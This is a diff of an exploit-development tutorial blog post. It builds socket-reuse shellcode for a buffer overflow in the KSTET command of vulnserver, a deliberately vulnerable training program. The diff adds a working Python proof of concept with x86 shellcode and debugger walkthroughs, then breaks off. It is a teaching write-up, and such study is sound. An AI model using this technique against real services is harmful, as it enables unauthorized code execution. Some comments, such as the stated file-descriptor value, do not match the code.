@@ -48,7 +48,7 @@ int recv(
 );
 ```
 
-The __first__ parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/OP resource, etc.). Since we will be working within the x86 architecture, this will look something like this- `0x00000090` (this number will vary). 
+The __first__ parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/OP resource, etc.). Since we will be working within the x86 architecture, this will look something like this- __`0x00000090`__ (this number will vary). 
 
 Also, one thing to remember, is a file descriptor is utilized by the OS. The file descriptor is not actually a raw value of `0x00000090` (or whatever value the OS is using). The OS would not know what to do with a this value, as it is not a coherent memory address- just an arbitrary value. The OS utilized a memory address that points to the fild descriptor value (a pointer).
 
@@ -140,7 +140,7 @@ Generating the File Descriptor
 ---
 Although we weill need to push our parameters on the stack in reverse order, we will start by generating the file descriptor. 
 
-From the observations above- it seems that our file descriptor is the value `0x00000088`. Knowing this, we will create a piece of shellcode to reflect this. Here are the instructions, using [nasm_shell](https://github.com/fishstiqz/nasmshell):
+From the observations above- it seems that our file descriptor is the value __`0x00000088`__. Knowing this, we will create a piece of shellcode to reflect this. Here are the instructions, using [nasm_shell](https://github.com/fishstiqz/nasmshell):
 
 ```console
 nasm > xor ecx, ecx
@@ -177,7 +177,7 @@ A Word About Data Sizes
 --
 Remember, a 32 bit register, when referencing the data inside of it, is known as a [__DWORD__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/262627d8-3418-4627-9218-4ffe110850b2), or a double word. A 16 bit register when referencing the data in it, is known as a [__WORD__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f8573df3-a44a-4a50-b070-ac4c3aa78e3c). An 8 bit register's data is known as a [__byte__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/d7edc080-e499-4219-a837-1bc40b64bb04). 
 
-The 32 bit register is comprised of 8 bytes: `0x12345678`. The number 8 represents the most significant byte. The CL register is located at the most significat byte of the ECX register (the same location as 8). This means, if we add 0x88 to the CL register, ECX will look like this:
+The 32 bit register is comprised of 8 bytes: __`0x12345678`__. The number 8 represents the most significant byte. The CL register is located at the most significat byte of the ECX register (the same location as 8). This means, if we add 0x88 to the CL register, ECX will look like this:
 
 ```console
 0x00000088
@@ -193,7 +193,7 @@ The third instruction:
 ```console
 push ecx
 ```
-This gets the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP- as ESP contains the value of the item on top of the stack.
+This gets the value onto the top of the stack. In other words, the value of __`0x00000088`__ is being stored in ESP- as ESP contains the value of the item on top of the stack.
 
 The last instruction:
 
@@ -201,9 +201,9 @@ The last instruction:
 mov edi, esp
 ```
 
-This will move the contents of ESP, into EDI. The reason we do this, is because this will create a memory address (ESP's address, which contains a pointer to the value `0x00000088`). EDI now is a memory address that points to the value of the file descriptor. 
+This will move the contents of ESP, into EDI. The reason we do this, is because this will create a memory address (ESP's address, which contains a pointer to the value __`0x00000088`__). EDI now is a memory address that points to the value of the file descriptor. 
 
-Although we did not find the ACTUAL file desciptor the OS generated, we are essentially "tricking" the OS into thinking this is the file description. The OS is only looking for a pointer that references the value `0x00000088`, not a specific memory address.
+Although we did not find the ACTUAL file desciptor the OS generated, we are essentially "tricking" the OS into thinking this is the file description. The OS is only looking for a pointer that references the value __`0x00000088`__, not a specific memory address.
 
 Before executing the POC, make sure to add a couple of software breakpoints (\xCC) BEFORE the shellcode! This is to pause execution, to allow for accurate calculations.
 
@@ -330,7 +330,7 @@ Flags
 ---
 Now that the file descriptor is out of the way- we will start with the last parameter, the flags. 
 
-The flags are the most painless of the flags. All that is needed is a value of `0x00000000` on the stack. Here is the shellcode for this:
+The flags are the most painless of the flags. All that is needed is a value of __`0x00000000`__ on the stack. Here is the shellcode for this:
 
 ```console
 nasm > xor edx, edx
@@ -512,3 +512,113 @@ Disassembler after instructions:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/021.png" alt="">
 
+Let's remember what we have accomplished and what we have left:
+
+1. We have got our flags and BufSize parameters on the stack.
+2. We need to find a buffer location.
+3. We need to eventually push our file descriptor pointer onto the stack
+4. We need to call the `WS_32.recv()` function.
+
+It should probably only take around 2-=30 more bytes to accomplish what we have left. Let's take this into consideration when choosing a buffer location.
+
+Referring to the disassembler image above, it looks like __`00C0F9F0`__ may be a good candidate!
+
+The current ESP value is at __`00C0F9A4`__ and we would like to turn that into __`00C0F9F0`__, for our purposes.
+
+Subtract the current ESP value from the wanted value:
+
+```console
+ 00C0F9F0
+-
+ 00C0F9A4
+-----------
+       4C
+```
+
+We will need to add `0x4C` to our current ESP value.
+
+TO do our calculations, we will need to push the current stack pointer onto the stack and pop it into EBX. Then, we will need to perform a calculation on EBX to get it equal to __`00C0F9F0`__. Then we will push the value onto the stack.
+
+Shellcode instructions:
+
+```console
+nasm > push esp
+00000000  54                push esp
+nasm > pop ebx
+00000000  5B                pop ebx
+nasm > add ebx, 0x4c
+00000000  83C34C            add ebx,byte +0x4c
+nasm > push ebx
+00000000  53                push ebx
+```
+
+Updated POC:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\xCC" * 2
+
+# Creating File Descriptor = 0x00000090
+crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
+
+# Move ESP out of the way
+crash += "\x83\xec\x50"			# sub esp, 0x50
+
+# Flags = 0x00000000
+crash += "\x31\xd2"
+crash += "\x52"				# push edx
+
+# BufSize = 0x00000200
+crash += "\x80\xc6\x02"			# add dh, 0x02
+crash += "\x52"				# push edx
+
+# Buffer = 0x00C0F9F0
+crash += "\x54"				# push esp
+crash += "\x5b"				# pop ebx
+crash += "\x83\xc3\x4c"			# add ebx, 0x4c
+crash += "\x53"				# push ebx
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
+
+Execution in Immunity:
+
+```console
+push esp
+pop ebx
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/022.png" alt="">
+
+```console
+add ebx, 0x4c
+```
+<img src="{{ site.url }}{{ site.baseurl }}/images/023.png" alt="">
+
+```console
+push ebx
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/024.png" alt="">
+
+File Descriptor, We Meet Again.
+---
